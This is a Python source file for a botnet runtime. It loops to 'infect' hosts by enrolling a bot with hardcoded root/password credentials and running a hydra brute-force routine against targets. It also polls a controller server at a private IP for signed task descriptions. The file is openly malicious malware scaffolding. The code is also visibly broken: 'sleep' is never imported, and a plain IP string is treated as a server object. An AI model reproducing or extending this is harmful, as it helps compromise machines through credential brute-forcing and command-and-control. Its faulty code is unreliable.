import settings
import botnet
import asyncio

class BotRunTime:
    def __init__(self, loop, server):
        self.loop = loop
        self.server = server
        self.loop.create_task(self.infect())
        self.loop.create_task(self.get_and_schedule_job())
        self.run()

#host ip:10.142.0.2
#host username:root
#host password:password
    async def infect(self):
        j=0
        while j<1:
            print('infect')
            botnet.add_bot('10.142.0.3','root','password')
            target = botnet.targets()
            botnet.hydra(target)
            #print(i.host for i in botnet.botnet)
            j=j+1
            await sleep(settings.INFECTION_CYCLE_TIME)
            self.loop.create_task(self.infect())

    async def get_and_schedule_job(self):
        while True:
            signed_task_description = self.server.get('task')
           # print(signed_task_description)
            await sleep(settings.GET_JOB_CYCLE_TIME)
            self.loop.create_task(self.get_and_schedule_job())

    def run(self):
        try:
            self.loop.run_forever()
        except KeyboardInterrupt:
            pass
        finally:
            self.server.stop()
            self.loop.close()

runtime = BotRunTime(asyncio.get_event_loop(),"10.142.0.2")
